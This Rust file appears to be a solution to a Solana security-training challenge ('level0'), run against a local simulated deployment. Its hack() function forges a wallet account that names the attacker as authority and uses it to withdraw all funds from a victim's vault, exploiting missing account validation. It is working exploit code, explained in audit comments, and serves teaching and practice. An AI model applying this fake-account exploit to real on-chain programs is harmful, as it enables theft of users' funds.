use std::{env, str::FromStr};

use owo_colors::OwoColorize;

use poc_framework::solana_sdk::signature::Keypair;
use poc_framework::{
    keypair, solana_sdk::signer::Signer, Environment, LocalEnvironment, PrintableTransaction,
};

use solana_program::instruction::{Instruction, AccountMeta};
use solana_program::native_token::lamports_to_sol;
use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program};

use level0::{Wallet, WalletInstruction};

use borsh::BorshSerialize;

struct Challenge {
    hacker: Keypair, // @audit-info hacker keypair -> us
    wallet_program: Pubkey, // @audit-info wallet program -> level0 
    wallet_address: Pubkey, // @audit-info wallet being used during attack -> the mock one
    vault_address: Pubkey, // @audit-info valut addree -> where the lamports held in the program, a PDA
    wallet_authority: Pubkey, // @audit-info wallet/vault authority -> victim
}

// Do your hacks in this function here
fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {

    // Step 0: how much money do we want to steal?
    let amount = env.get_account(challenge.vault_address).unwrap().lamports;
    // Step 1: a fake wallet with the same vault
    let mock_wallet_info = Wallet{
        authority: challenge.hacker.pubkey(), // @audit mock the wallet and put ourselves as the authority to bypass the signer validation
        vault: challenge.vault_address,
    };

    let mock_wallet = keypair(9);
    let mut mock_wallet_data: Vec<u8> = vec![];

    mock_wallet_info.serialize(&mut mock_wallet_data).unwrap();
    env.create_account_with_data(&mock_wallet, mock_wallet_data);
    // Step 2: Use fake wallet to withdraw funds from the real vault to the attacker
    env.execute_as_transaction(
        &[Instruction {
            program_id: challenge.wallet_program,
            accounts: vec![
                AccountMeta::new(mock_wallet.pubkey(), false),
                AccountMeta::new(challenge.vault_address, false),
                AccountMeta::new(challenge.hacker.pubkey(), true),
                AccountMeta::new(challenge.hacker.pubkey(), false),
                AccountMeta::new_readonly(system_program::id(), false),
            ],
            data: WalletInstruction::Withdraw { amount }.try_to_vec().unwrap(),
        }],
        &[&challenge.hacker],).print();
}

/*
SETUP CODE BELOW
*/
pub fn main() {
    let (mut env, challenge, internal) = setup();
    let before_balance = env.get_account(challenge.hacker.pubkey()).unwrap().lamports;
    hack(&mut env, &challenge);
    verify(&mut env, challenge, before_balance, internal);
}

struct Internal {
    wallet_authority: Keypair,
    wallet_amount: u64,
}

fn verify(
    env: &mut LocalEnvironment,
    challenge: Challenge,
    before_balance: u64,
    internal: Internal,
) {
    let after = env.get_account(challenge.hacker.pubkey()).unwrap().lamports;

    let tx = env.execute_as_transaction(
        &[level0::withdraw(
            challenge.wallet_program,
            challenge.wallet_authority,
            challenge.wallet_address,
            internal.wallet_amount,
        )],
        &[&internal.wallet_authority],
    );
    tx.print_named("Verification: authority withdraw");

    if tx.transaction.meta.unwrap().err.is_none() {
        println!(
            "[*] {}",
            "Original wallet authority successfully withdrew all funds.".red()
        )
    } else {
        println!(
            "[!] {}",
            "Original wallet authority cannot withdraw his funds anymore.".green()
        )
    }

    if after > before_balance {
        println!("[*] {}", "Congratulations, the exploit succeeded!".green());
        println!(
            "[*] Hacker has {} SOL more! ({} vs {})",
            lamports_to_sol(after - before_balance).green(),
            before_balance,
            after
        );
    } else {
        println!("[*] {}", "Exploit not successful.".red());
        println!(
            "[*] Hacker has {} SOL less! ({} vs {})",
            lamports_to_sol(before_balance - after).red(),
            before_balance,
            after
        );
    }
}

fn setup() -> (LocalEnvironment, Challenge, Internal) {
    let mut dir = env::current_exe().unwrap();
    let path = {
        dir.pop();
        dir.pop();
        dir.push("deploy");
        dir.push("level0.so");
        dir.to_str()
    }
    .unwrap();

    let wallet_program = Pubkey::from_str("W4113t3333333333333333333333333333333333333").unwrap();
    let wallet_authority = keypair(0);
    let rich_boi = keypair(1);
    let hacker = keypair(42);

    let a_lot_of_money = sol_to_lamports(1_000_000.0);

    let mut env = LocalEnvironment::builder()
        .add_program(wallet_program, path)
        .add_account_with_lamports(
            wallet_authority.pubkey(),
            system_program::ID,
            sol_to_lamports(100.0),
        )
        .add_account_with_lamports(rich_boi.pubkey(), system_program::ID, a_lot_of_money * 2)
        .add_account_with_lamports(hacker.pubkey(), system_program::ID, sol_to_lamports(1.0))
        .build();

    let wallet_address = level0::get_wallet_address(wallet_authority.pubkey(), wallet_program);

    let vault_address = level0::get_vault_address(wallet_authority.pubkey(), wallet_program);

    // Create Wallet
    env.execute_as_transaction(
        &[level0::initialize(
            wallet_program,
            wallet_authority.pubkey(),
        )],
        &[&wallet_authority],
    ).assert_success();

    println!("[*] Wallet created!");

    // rich boi pays for bill
    env.execute_as_transaction(
        &[level0::deposit(
            wallet_program,
            wallet_authority.pubkey(),
            rich_boi.pubkey(),
            a_lot_of_money,
        )],
        &[&rich_boi],
    ).assert_success();
    println!("[*] rich boi payed his bills");

    (
        env,
        Challenge {
            wallet_address,
            vault_address,
            hacker,
            wallet_program,
            wallet_authority: wallet_authority.pubkey(),
        },
        Internal {
            wallet_authority,
            wallet_amount: a_lot_of_money,
        },
    )
}
